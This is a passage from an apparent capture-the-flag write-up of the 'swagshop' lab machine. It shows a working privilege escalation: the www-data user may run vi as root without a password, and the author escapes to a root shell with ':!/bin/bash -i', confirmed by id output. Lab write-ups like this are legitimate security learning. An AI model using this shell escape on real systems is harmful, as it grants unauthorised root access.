# 15 - PrivEsc

# Sudo
```bash
www-data@swagshop:/var/www/html$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

Privilege Escalation turns out to be easier than what I expected. Vi has builtin code execution mechanism.


```bash
www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/mage
vi>:!/bin/bash -i


root@swagshop:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```




